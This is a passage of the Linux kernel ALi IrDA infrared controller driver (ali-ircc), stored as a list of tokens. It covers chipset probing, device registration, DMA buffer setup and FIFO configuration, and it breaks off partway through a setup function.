".", "tw", ">", "*", "Created", "at", ":", "2000", "/", "10", "/", "16", "03", ":", "46PM", "*", "Modified", "at", ":", "2001", "/", "1", "/", "3", "02", ":", "55PM", "*", "Modified", "by", ":", "Benjamin", "Kong", "<", "benjamin_kong", "@", "ali", ".", "com", ".", "tw", ">", "*", "Modified", "at", ":", "2003", "/", "11", "/", "6", "and", "support", "for", "ALi", "south", "-", "bridge", "chipsets", "M1563", "*", "Modified", "by", ":", "Clear", "Zhang", "<", "clear_zhang", "@", "ali", ".", "com", ".", "tw", ">", "*", "*", "Copyright", "(", "c", ")", "2000", "Benjamin", "Kong", "<", "benjamin_kong", "@", "ali", ".", "com", ".", "tw", ">", "*", "All", "Rights", "Reserved", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "gfp", ".", "h", ">", "#", "include", "<", "linux", "/", "kernel", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "linux", "/", "skbuff", ".", "h", ">", "#", "include", "<", "linux", "/", "netdevice", ".", "h", ">", "#", "include", "<", "linux", "/", "ioport", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "include", "<", "linux", "/", "rtnetlink", ".", "h", ">", "#", "include", "<", "linux", "/", "serial_reg", ".", "h", ">", "#", "include", "<", "linux", "/", "dma", "-", "mapping", ".", "h", ">", "#", "include", "<", "linux", "/", "platform_device", ".", "h", ">", "#", "include", "<", "asm", "/", "io", ".", "h", ">", "#", "include", "<", "asm", "/", "dma", ".", "h", ">", "#", "include", "<", "asm", "/", "byteorder", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "wrapper", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda_device", ".", "h", ">", "#", "include", "\"", "ali", "-", "ircc", ".", "h", "\"", "#", "define", "CHIP_IO_EXTENT", "8", "#", "define", "BROKEN_DONGLE_ID", "#", "define", "ALI_IRCC_DRIVER_NAME", "\"", "ali", "-", "ircc", "\"", "/", "*", "Power", "Management", "*", "/", "static", "int", "ali_ircc_suspend", "(", "struct", "platform_device", "*", "dev", ",", "pm_message_t", "state", ")", ";", "static", "int", "ali_ircc_resume", "(", "struct", "platform_device", "*", "dev", ")", ";", "static", "struct", "platform_driver", "ali_ircc_driver", "=", "{", ".", "suspend", "=", "ali_ircc_suspend", ",", ".", "resume", "=", "ali_ircc_resume", ",", ".", "driver", "=", "{", ".", "name", "=", "ALI_IRCC_DRIVER_NAME", ",", "}", ",", "}", ";", "/", "*", "Module", "parameters", "*", "/", "static", "int", "qos_mtt_bits", "=", "0x07", ";", "/", "*", "1", "ms", "or", "more", "*", "/", "/", "*", "Use", "BIOS", "settions", "by", "default", ",", "but", "user", "may", "supply", "module", "parameters", "*", "/", "static", "unsigned", "int", "io", "[", "]", "=", "{", "~", "0", ",", "~", "0", ",", "~", "0", ",", "~", "0", "}", ";", "static", "unsigned", "int", "irq", "[", "]", "=", "{", "0", ",", "0", ",", "0", ",", "0", "}", ";", "static", "unsigned", "int", "dma", "[", "]", "=", "{", "0", ",", "0", ",", "0", ",", "0", "}", ";", "static", "int", "ali_ircc_probe_53", "(", "ali_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "static", "int", "ali_ircc_init_43", "(", "ali_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "static", "int", "ali_ircc_init_53", "(", "ali_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "/", "*", "These", "are", "the", "currently", "known", "ALi", "south", "-", "bridge", "chipsets", ",", "the", "only", "one", "difference", "*", "is", "that", "M1543C", "doesn", "'", "t", "support", "HP", "HDSL", "-", "3600", "*", "/", "static", "ali_chip_t", "chips", "[", "]", "=", "{", "{", "\"", "M1543", "\"", ",", "{", "0x3f0", ",", "0x370", "}", ",", "0x51", ",", "0x23", ",", "0x20", ",", "0x43", ",", "ali_ircc_probe_53", ",", "ali_ircc_init_43", "}", ",", "{", "\"", "M1535", "\"", ",", "{", "0x3f0", ",", "0x370", "}", ",", "0x51", ",", "0x23", ",", "0x20", ",", "0x53", ",", "ali_ircc_probe_53", ",", "ali_ircc_init_53", "}", ",", "{", "\"", "M1563", "\"", ",", "{", "0x3f0", ",", "0x370", "}", ",", "0x51", ",", "0x23", ",", "0x20", ",", "0x63", ",", "ali_ircc_probe_53", ",", "ali_ircc_init_53", "}", ",", "{", "NULL", "}", "}", ";", "/", "*", "Max", "4", "instances", "for", "now", "*", "/", "static", "struct", "ali_ircc_cb", "*", "dev_self", "[", "]", "=", "{", "NULL", ",", "NULL", ",", "NULL", ",", "NULL", "}", ";", "/", "*", "Dongle", "Types", "*", "/", "static", "char", "*", "dongle_types", "[", "]", "=", "{", "\"", "TFDS6000", "\"", ",", "\"", "HP", "HSDL", "-", "3600", "\"", ",", "\"", "HP", "HSDL", "-", "1100", "\"", ",", "\"", "No", "dongle", "connected", "\"", ",", "}", ";", "/", "*", "Some", "prototypes", "*", "/", "static", "int", "ali_ircc_open", "(", "int", "i", ",", "chipio_t", "*", "info", ")", ";", "static", "int", "ali_ircc_close", "(", "struct", "ali_ircc_cb", "*", "self", ")", ";", "static", "int", "ali_ircc_setup", "(", "chipio_t", "*", "info", ")", ";", "static", "int", "ali_ircc_is_receiving", "(", "struct", "ali_ircc_cb", "*", "self", ")", ";", "static", "int", "ali_ircc_net_open", "(", "struct", "net_device", "*", "dev", ")", ";", "static", "int", "ali_ircc_net_close", "(", "struct", "net_device", "*", "dev", ")", ";", "static", "int", "ali_ircc_net_ioctl", "(", "struct", "net_device", "*", "dev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", ";", "static", "void", "ali_ircc_change_speed", "(", "struct", "ali_ircc_cb", "*", "self", ",", "__u32", "baud", ")", ";", "/", "*", "SIR", "function", "*", "/", "static", "netdev_tx_t", "ali_ircc_sir_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", ";", "static", "irqreturn_t", "ali_ircc_sir_interrupt", "(", "struct", "ali_ircc_cb", "*", "self", ")", ";", "static", "void", "ali_ircc_sir_receive", "(", "struct", "ali_ircc_cb", "*", "self", ")", ";", "static", "void", "ali_ircc_sir_write_wakeup", "(", "struct", "ali_ircc_cb", "*", "self", ")", ";", "static", "int", "ali_ircc_sir_write", "(", "int", "iobase", ",", "int", "fifo_size", ",", "__u8", "*", "buf", ",", "int", "len", ")", ";", "static", "void", "ali_ircc_sir_change_speed", "(", "struct", "ali_ircc_cb", "*", "priv", ",", "__u32", "speed", ")", ";", "/", "*", "FIR", "function", "*", "/", "static", "netdev_tx_t", "ali_ircc_fir_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", ";", "static", "void", "ali_ircc_fir_change_speed", "(", "struct", "ali_ircc_cb", "*", "priv", ",", "__u32", "speed", ")", ";", "static", "irqreturn_t", "ali_ircc_fir_interrupt", "(", "struct", "ali_ircc_cb", "*", "self", ")", ";", "static", "int", "ali_ircc_dma_receive", "(", "struct", "ali_ircc_cb", "*", "self", ")", ";", "static", "int", "ali_ircc_dma_receive_complete", "(", "struct", "ali_ircc_cb", "*", "self", ")", ";", "static", "int", "ali_ircc_dma_xmit_complete", "(", "struct", "ali_ircc_cb", "*", "self", ")", ";", "static", "void", "ali_ircc_dma_xmit", "(", "struct", "ali_ircc_cb", "*", "self", ")", ";", "/", "*", "My", "Function", "*", "/", "static", "int", "ali_ircc_read_dongle_id", "(", "int", "i", ",", "chipio_t", "*", "info", ")", ";", "static", "void", "ali_ircc_change_dongle_speed", "(", "struct", "ali_ircc_cb", "*", "priv", ",", "int", "speed", ")", ";", "/", "*", "ALi", "chip", "function", "*", "/", "static", "void", "SIR2FIR", "(", "int", "iobase", ")", ";", "static", "void", "FIR2SIR", "(", "int", "iobase", ")", ";", "static", "void", "SetCOMInterrupts", "(", "struct", "ali_ircc_cb", "*", "self", ",", "unsigned", "char", "enable", ")", ";", "/", "*", "*", "Function", "ali_ircc_init", "(", ")", "*", "*", "Initialize", "chip", ".", "Find", "out", "whay", "kinds", "of", "chips", "we", "are", "dealing", "with", "*", "and", "their", "configuration", "registers", "address", "*", "/", "static", "int", "__init", "ali_ircc_init", "(", "void", ")", "{", "ali_chip_t", "*", "chip", ";", "chipio_t", "info", ";", "int", "ret", ";", "int", "cfg", ",", "cfg_base", ";", "int", "reg", ",", "revision", ";", "int", "i", "=", "0", ";", "ret", "=", "platform_driver_register", "(", "&", "ali_ircc_driver", ")", ";", "if", "(", "ret", ")", "{", "net_err_ratelimited", "(", "\"%", "s", ",", "Can", "'", "t", "register", "driver", "!", "\\", "n", "\"", ",", "ALI_IRCC_DRIVER_NAME", ")", ";", "return", "ret", ";", "}", "ret", "=", "-", "ENODEV", ";", "/", "*", "Probe", "for", "all", "the", "ALi", "chipsets", "we", "know", "about", "*", "/", "for", "(", "chip", "=", "chips", ";", "chip", "-", ">", "name", ";", "chip", "+", "+,", "i", "+", "+)", "{", "pr_debug", "(", "\"%", "s", "(", "),", "Probing", "for", "%", "s", ".", "..", "\\", "n", "\"", ",", "__func__", ",", "chip", "-", ">", "name", ")", ";", "/", "*", "Try", "all", "config", "registers", "for", "this", "chip", "*", "/", "for", "(", "cfg", "=", "0", ";", "cfg", "<", "2", ";", "cfg", "+", "+)", "{", "cfg_base", "=", "chip", "-", ">", "cfg", "[", "cfg", "]", ";", "if", "(", "!", "cfg_base", ")", "continue", ";", "memset", "(", "&", "info", ",", "0", ",", "sizeof", "(", "chipio_t", ")", ");", "info", ".", "cfg_base", "=", "cfg_base", ";", "info", ".", "fir_base", "=", "io", "[", "i", "]", ";", "info", ".", "dma", "=", "dma", "[", "i", "]", ";", "info", ".", "irq", "=", "irq", "[", "i", "]", ";", "/", "*", "Enter", "Configuration", "*", "/", "outb", "(", "chip", "-", ">", "entr1", ",", "cfg_base", ")", ";", "outb", "(", "chip", "-", ">", "entr2", ",", "cfg_base", ")", ";", "/", "*", "Select", "Logical", "Device", "5", "Registers", "(", "UART2", ")", "*", "/", "outb", "(", "0x07", ",", "cfg_base", ")", ";", "outb", "(", "0x05", ",", "cfg_base", "+", "1", ")", ";", "/", "*", "Read", "Chip", "Identification", "Register", "*", "/", "outb", "(", "chip", "-", ">", "cid_index", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "if", "(", "reg", "=", "=", "chip", "-", ">", "cid_value", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "Chip", "found", "at", "0x", "%", "03x", "\\", "n", "\"", ",", "__func__", ",", "cfg_base", ")", ";", "outb", "(", "0x1F", ",", "cfg_base", ")", ";", "revision", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "Found", "%", "s", "chip", ",", "revision", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "chip", "-", ">", "name", ",", "revision", ")", ";", "/", "*", "*", "If", "the", "user", "supplies", "the", "base", "address", ",", "then", "*", "we", "init", "the", "chip", ",", "if", "not", "we", "probe", "the", "values", "*", "set", "by", "the", "BIOS", "*", "/", "if", "(", "io", "[", "i", "]", "<", "2000", ")", "{", "chip", "-", ">", "init", "(", "chip", ",", "&", "info", ")", ";", "}", "else", "{", "chip", "-", ">", "probe", "(", "chip", ",", "&", "info", ")", ";", "}", "if", "(", "ali_ircc_open", "(", "i", ",", "&", "info", ")", "=", "=", "0", ")", "ret", "=", "0", ";", "i", "+", "+;", "}", "else", "{", "pr_debug", "(", "\"%", "s", "(", "),", "No", "%", "s", "chip", "at", "0x", "%", "03x", "\\", "n", "\"", ",", "__func__", ",", "chip", "-", ">", "name", ",", "cfg_base", ")", ";", "}", "/", "*", "Exit", "configuration", "*", "/", "outb", "(", "0xbb", ",", "cfg_base", ")", ";", "}", "}", "if", "(", "ret", ")", "platform_driver_unregister", "(", "&", "ali_ircc_driver", ")", ";", "return", "ret", ";", "}", "/", "*", "*", "Function", "ali_ircc_cleanup", "(", ")", "*", "*", "Close", "all", "configured", "chips", "*", "*", "/", "static", "void", "__exit", "ali_ircc_cleanup", "(", "void", ")", "{", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "ARRAY_SIZE", "(", "dev_self", ")", ";", "i", "+", "+)", "{", "if", "(", "dev_self", "[", "i", "]", ")", "ali_ircc_close", "(", "dev_self", "[", "i", "]", ");", "}", "platform_driver_unregister", "(", "&", "ali_ircc_driver", ")", ";", "}", "static", "const", "struct", "net_device_ops", "ali_ircc_sir_ops", "=", "{", ".", "ndo_open", "=", "ali_ircc_net_open", ",", ".", "ndo_stop", "=", "ali_ircc_net_close", ",", ".", "ndo_start_xmit", "=", "ali_ircc_sir_hard_xmit", ",", ".", "ndo_do_ioctl", "=", "ali_ircc_net_ioctl", ",", "}", ";", "static", "const", "struct", "net_device_ops", "ali_ircc_fir_ops", "=", "{", ".", "ndo_open", "=", "ali_ircc_net_open", ",", ".", "ndo_stop", "=", "ali_ircc_net_close", ",", ".", "ndo_start_xmit", "=", "ali_ircc_fir_hard_xmit", ",", ".", "ndo_do_ioctl", "=", "ali_ircc_net_ioctl", ",", "}", ";", "/", "*", "*", "Function", "ali_ircc_open", "(", "int", "i", ",", "chipio_t", "*", "inf", ")", "*", "*", "Open", "driver", "instance", "*", "*", "/", "static", "int", "ali_ircc_open", "(", "int", "i", ",", "chipio_t", "*", "info", ")", "{", "struct", "net_device", "*", "dev", ";", "struct", "ali_ircc_cb", "*", "self", ";", "int", "dongle_id", ";", "int", "err", ";", "if", "(", "i", ">", "=", "ARRAY_SIZE", "(", "dev_self", ")", ")", "{", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "maximum", "number", "of", "supported", "chips", "reached", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "return", "-", "ENOMEM", ";", "}", "/", "*", "Set", "FIR", "FIFO", "and", "DMA", "Threshold", "*", "/", "if", "(", "(", "ali_ircc_setup", "(", "info", ")", ")", "=", "=", "-", "1", ")", "return", "-", "1", ";", "dev", "=", "alloc_irdadev", "(", "sizeof", "(", "*", "self", ")", ");", "if", "(", "dev", "=", "=", "NULL", ")", "{", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "can", "'", "t", "allocate", "memory", "for", "control", "block", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "return", "-", "ENOMEM", ";", "}", "self", "=", "netdev_priv", "(", "dev", ")", ";", "self", "-", ">", "netdev", "=", "dev", ";", "spin_lock_init", "(", "&", "self", "-", ">", "lock", ")", ";", "/", "*", "Need", "to", "store", "self", "somewhere", "*", "/", "dev_self", "[", "i", "]", "=", "self", ";", "self", "-", ">", "index", "=", "i", ";", "/", "*", "Initialize", "IO", "*", "/", "self", "-", ">", "io", ".", "cfg_base", "=", "info", "-", ">", "cfg_base", ";", "/", "*", "In", "ali_ircc_probe_53", "assign", "*", "/", "self", "-", ">", "io", ".", "fir_base", "=", "info", "-", ">", "fir_base", ";", "/", "*", "info", "-", ">", "sir_base", "=", "info", "-", ">", "fir_base", "*", "/", "self", "-", ">", "io", ".", "sir_base", "=", "info", "-", ">", "sir_base", ";", "/", "*", "ALi", "SIR", "and", "FIR", "use", "the", "same", "address", "*", "/", "self", "-", ">", "io", ".", "irq", "=", "info", "-", ">", "irq", ";", "self", "-", ">", "io", ".", "fir_ext", "=", "CHIP_IO_EXTENT", ";", "self", "-", ">", "io", ".", "dma", "=", "info", "-", ">", "dma", ";", "self", "-", ">", "io", ".", "fifo_size", "=", "16", ";", "/", "*", "SIR", ":", "16", ",", "FIR", ":", "32", "Benjamin", "2000", "/", "11", "/", "1", "*", "/", "/", "*", "Reserve", "the", "ioports", "that", "we", "need", "*", "/", "if", "(", "!", "request_region", "(", "self", "-", ">", "io", ".", "fir_base", ",", "self", "-", ">", "io", ".", "fir_ext", ",", "ALI_IRCC_DRIVER_NAME", ")", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "can", "'", "t", "get", "iobase", "of", "0x", "%", "03x", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "io", ".", "fir_base", ")", ";", "err", "=", "-", "ENODEV", ";", "goto", "err_out1", ";", "}", "/", "*", "Initialize", "QoS", "for", "this", "device", "*", "/", "irda_init_max_qos_capabilies", "(", "&", "self", "-", ">", "qos", ")", ";", "/", "*", "The", "only", "value", "we", "must", "override", "it", "the", "baudrate", "*", "/", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "=", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", "|", "IR_115200", "|", "IR_576000", "|", "IR_1152000", "|", "(", "IR_4000000", "<", "<", "8", ")", ";", "/", "/", "benjamin", "2000", "/", "11", "/", "8", "05", ":", "27PM", "self", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "=", "qos_mtt_bits", ";", "irda_qos_bits_to_value", "(", "&", "self", "-", ">", "qos", ")", ";", "/", "*", "Max", "DMA", "buffer", "size", "needed", "=", "(", "data_size", "+", "6", ")", "*", "(", "window_size", ")", "+", "6", ";", "*", "/", "self", "-", ">", "rx_buff", ".", "truesize", "=", "14384", ";", "self", "-", ">", "tx_buff", ".", "truesize", "=", "14384", ";", "/", "*", "Allocate", "memory", "if", "needed", "*", "/", "self", "-", ">", "rx_buff", ".", "head", "=", "dma_zalloc_coherent", "(", "NULL", ",", "self", "-", ">", "rx_buff", ".", "truesize", ",", "&", "self", "-", ">", "rx_buff_dma", ",", "GFP_KERNEL", ")", ";", "if", "(", "self", "-", ">", "rx_buff", ".", "head", "=", "=", "NULL", ")", "{", "err", "=", "-", "ENOMEM", ";", "goto", "err_out2", ";", "}", "self", "-", ">", "tx_buff", ".", "head", "=", "dma_zalloc_coherent", "(", "NULL", ",", "self", "-", ">", "tx_buff", ".", "truesize", ",", "&", "self", "-", ">", "tx_buff_dma", ",", "GFP_KERNEL", ")", ";", "if", "(", "self", "-", ">", "tx_buff", ".", "head", "=", "=", "NULL", ")", "{", "err", "=", "-", "ENOMEM", ";", "goto", "err_out3", ";", "}", "self", "-", ">", "rx_buff", ".", "in_frame", "=", "FALSE", ";", "self", "-", ">", "rx_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "self", "-", ">", "tx_buff", ".", "data", "=", "self", "-", ">", "tx_buff", ".", "head", ";", "self", "-", ">", "rx_buff", ".", "data", "=", "self", "-", ">", "rx_buff", ".", "head", ";", "/", "*", "Reset", "Tx", "queue", "info", "*", "/", "self", "-", ">", "tx_fifo", ".", "len", "=", "self", "-", ">", "tx_fifo", ".", "ptr", "=", "self", "-", ">", "tx_fifo", ".", "free", "=", "0", ";", "self", "-", ">", "tx_fifo", ".", "tail", "=", "self", "-", ">", "tx_buff", ".", "head", ";", "/", "*", "Override", "the", "network", "functions", "we", "need", "to", "use", "*", "/", "dev", "-", ">", "netdev_ops", "=", "&", "ali_ircc_sir_ops", ";", "err", "=", "register_netdev", "(", "dev", ")", ";", "if", "(", "err", ")", "{", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "register_netdev", "(", ")", "failed", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "goto", "err_out4", ";", "}", "net_info_ratelimited", "(", "\"", "IrDA", ":", "Registered", "device", "%", "s", "\\", "n", "\"", ",", "dev", "-", ">", "name", ")", ";", "/", "*", "Check", "dongle", "id", "*", "/", "dongle_id", "=", "ali_ircc_read_dongle_id", "(", "i", ",", "info", ")", ";", "net_info_ratelimited", "(", "\"%", "s", "(", "),", "%", "s", ",", "Found", "dongle", ":", "%", "s", "\\", "n", "\"", ",", "__func__", ",", "ALI_IRCC_DRIVER_NAME", ",", "dongle_types", "[", "dongle_id", "]", ");", "self", "-", ">", "io", ".", "dongle_id", "=", "dongle_id", ";", "return", "0", ";", "err_out4", ":", "dma_free_coherent", "(", "NULL", ",", "self", "-", ">", "tx_buff", ".", "truesize", ",", "self", "-", ">", "tx_buff", ".", "head", ",", "self", "-", ">", "tx_buff_dma", ")", ";", "err_out3", ":", "dma_free_coherent", "(", "NULL", ",", "self", "-", ">", "rx_buff", ".", "truesize", ",", "self", "-", ">", "rx_buff", ".", "head", ",", "self", "-", ">", "rx_buff_dma", ")", ";", "err_out2", ":", "release_region", "(", "self", "-", ">", "io", ".", "fir_base", ",", "self", "-", ">", "io", ".", "fir_ext", ")", ";", "err_out1", ":", "dev_self", "[", "i", "]", "=", "NULL", ";", "free_netdev", "(", "dev", ")", ";", "return", "err", ";", "}", "/", "*", "*", "Function", "ali_ircc_close", "(", "self", ")", "*", "*", "Close", "driver", "instance", "*", "*", "/", "static", "int", "__exit", "ali_ircc_close", "(", "struct", "ali_ircc_cb", "*", "self", ")", "{", "int", "iobase", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "iobase", "=", "self", "-", ">", "io", ".", "fir_base", ";", "/", "*", "Remove", "netdevice", "*", "/", "unregister_netdev", "(", "self", "-", ">", "netdev", ")", ";", "/", "*", "Release", "the", "PORT", "that", "this", "driver", "is", "using", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "Releasing", "Region", "%", "03x", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "io", ".", "fir_base", ")", ";", "release_region", "(", "self", "-", ">", "io", ".", "fir_base", ",", "self", "-", ">", "io", ".", "fir_ext", ")", ";", "if", "(", "self", "-", ">", "tx_buff", ".", "head", ")", "dma_free_coherent", "(", "NULL", ",", "self", "-", ">", "tx_buff", ".", "truesize", ",", "self", "-", ">", "tx_buff", ".", "head", ",", "self", "-", ">", "tx_buff_dma", ")", ";", "if", "(", "self", "-", ">", "rx_buff", ".", "head", ")", "dma_free_coherent", "(", "NULL", ",", "self", "-", ">", "rx_buff", ".", "truesize", ",", "self", "-", ">", "rx_buff", ".", "head", ",", "self", "-", ">", "rx_buff_dma", ")", ";", "dev_self", "[", "self", "-", ">", "index", "]", "=", "NULL", ";", "free_netdev", "(", "self", "-", ">", "netdev", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "ali_ircc_init_43", "(", "chip", ",", "info", ")", "*", "*", "Initialize", "the", "ALi", "M1543", "chip", ".", "*", "/", "static", "int", "ali_ircc_init_43", "(", "ali_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", "{", "/", "*", "All", "controller", "information", "like", "I", "/", "O", "address", ",", "DMA", "channel", ",", "IRQ", "*", "are", "set", "by", "BIOS", "*", "/", "return", "0", ";", "}", "/", "*", "*", "Function", "ali_ircc_init_53", "(", "chip", ",", "info", ")", "*", "*", "Initialize", "the", "ALi", "M1535", "chip", ".", "*", "/", "static", "int", "ali_ircc_init_53", "(", "ali_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", "{", "/", "*", "All", "controller", "information", "like", "I", "/", "O", "address", ",", "DMA", "channel", ",", "IRQ", "*", "are", "set", "by", "BIOS", "*", "/", "return", "0", ";", "}", "/", "*", "*", "Function", "ali_ircc_probe_53", "(", "chip", ",", "info", ")", "*", "*", "Probes", "for", "the", "ALi", "M1535D", "or", "M1535", "*", "/", "static", "int", "ali_ircc_probe_53", "(", "ali_chip_t", "*", "chip", ",", "chipio_t", "*", "info", ")", "{", "int", "cfg_base", "=", "info", "-", ">", "cfg_base", ";", "int", "hi", ",", "low", ",", "reg", ";", "/", "*", "Enter", "Configuration", "*", "/", "outb", "(", "chip", "-", ">", "entr1", ",", "cfg_base", ")", ";", "outb", "(", "chip", "-", ">", "entr2", ",", "cfg_base", ")", ";", "/", "*", "Select", "Logical", "Device", "5", "Registers", "(", "UART2", ")", "*", "/", "outb", "(", "0x07", ",", "cfg_base", ")", ";", "outb", "(", "0x05", ",", "cfg_base", "+", "1", ")", ";", "/", "*", "Read", "address", "control", "register", "*", "/", "outb", "(", "0x60", ",", "cfg_base", ")", ";", "hi", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "outb", "(", "0x61", ",", "cfg_base", ")", ";", "low", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "fir_base", "=", "(", "hi", "<", "<", "8", ")", "+", "low", ";", "info", "-", ">", "sir_base", "=", "info", "-", ">", "fir_base", ";", "pr_debug", "(", "\"%", "s", "(", "),", "probing", "fir_base", "=", "0x", "%", "03x", "\\", "n", "\"", ",", "__func__", ",", "info", "-", ">", "fir_base", ")", ";", "/", "*", "Read", "IRQ", "control", "register", "*", "/", "outb", "(", "0x70", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "irq", "=", "reg", "&", "0x0f", ";", "pr_debug", "(", "\"%", "s", "(", "),", "probing", "irq", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "info", "-", ">", "irq", ")", ";", "/", "*", "Read", "DMA", "channel", "*", "/", "outb", "(", "0x74", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "dma", "=", "reg", "&", "0x07", ";", "if", "(", "info", "-", ">", "dma", "=", "=", "0x04", ")", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "No", "DMA", "channel", "assigned", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "else", "pr_debug", "(", "\"%", "s", "(", "),", "probing", "dma", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "info", "-", ">", "dma", ")", ";", "/", "*", "Read", "Enabled", "Status", "*", "/", "outb", "(", "0x30", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "enabled", "=", "(", "reg", "&", "0x80", ")", "&", "&", "(", "reg", "&", "0x01", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "probing", "enabled", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "info", "-", ">", "enabled", ")", ";", "/", "*", "Read", "Power", "Status", "*", "/", "outb", "(", "0x22", ",", "cfg_base", ")", ";", "reg", "=", "inb", "(", "cfg_base", "+", "1", ")", ";", "info", "-", ">", "suspended", "=", "(", "reg", "&", "0x20", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "probing", "suspended", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "info", "-", ">", "suspended", ")", ";", "/", "*", "Exit", "configuration", "*", "/", "outb", "(", "0xbb", ",", "cfg_base", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "ali_ircc_setup", "(", "info", ")", "*", "*", "Set", "FIR", "FIFO", "and", "DMA", "Threshold", "*", "Returns", "non", "-", "negative", "on", "success", ".", "*", "*", "/", "static", "int", "ali_ircc_setup", "(", "chipio_t", "*", "info", ")", "{", "unsigned", "char", "tmp", ";", "int", "version", ";", "int", "iobase", "=", "info", "-", ">", "fir_base", ";", "/", "*", "Locking", "comments", ":", "*", "Most", "operations", "here", "need", "to", "be", "protected", ".", "We", "are", "called", "before", "*", "the", "device", "instance", "is", "created", "in", "ali_ircc_open", "(", "),", "therefore", "*", "nobody", "can", "bother", "us", "-", "Jean", "II", "*", "/", "/", "*", "Switch", "to", "FIR", "space", "*", "/", "SIR2FIR", "(", "iobase", ")", ";", "/", "*", "Master", "Reset", "*", "/", "outb", "(", "0x40", ",", "iobase", "+", "FIR_MCR", ")", ";", "/", "/", "benjamin", "2000", "/", "11", "/", "30", "11", ":", "45AM", "/", "*", "Read", "FIR", "ID", "Version", "Register", "*", "/", "switch_bank", "(", "iobase", ",", "BANK3", ")", ";", "version", "=", "inb", "(", "iobase", "+", "FIR_ID_VR", ")", ";", "/", "*", "Should", "be", "0x00", "in", "the", "M1535", "/", "M1535D", "*", "/", "if", "(", "version", "!", "=", "0x00", ")", "{", "net_err_ratelimited", "(", "\"%", "s", ",", "Wrong", "chip", "version", "%", "02x", "\\", "n", "\"", ",", "ALI_IRCC_DRIVER_NAME", ",", "version", ")", ";", "return", "-", "1", ";", "}", "/", "*", "Set", "FIR", "FIFO", "Threshold", "Register", "*", "/", "switch_bank", "(", "iobase", ",", "BANK1", ")", ";", "outb", "(", "RX_FIFO_Threshold", ",", "iobase", "+", "FIR_FIFO_TR", ")", ";", "/", "*", "Set", "FIR", "DMA", "Threshold", "Register", "*", "/", "outb", "(", "RX_DMA_Threshold", ",", "iobase", "+", "FIR_DMA_TR", ")", ";", "/", "*", "CRC", "enable", "*", "/", "switch_bank", "(", "iobase", ",", "BANK2", ")", ";", "outb", "(", "inb", "(", "iobase", "+", "FIR_IRDA_CR", ")", "|", "IRDA_CR_CRC", ",", "iobase", "+", "FIR_IRDA_CR", ")", ";", "/", "*", "NDIS", "driver", "set", "TX", "Length", "here", "BANK2", "Alias", "3", ",", "Alias4", "*", "/", "/", "*", "Switch", "to", "Bank", "0", "*", "/", "switch_bank", "(", "iobase", ",", "BANK0", ")", ";", "tmp", "=", "inb", "(", "iobase", "+", "FIR_LCR_B", ")", ";", "tmp", "&", "=~", "0x20", ";", "/", "/", "disable", "SIP", "tmp", 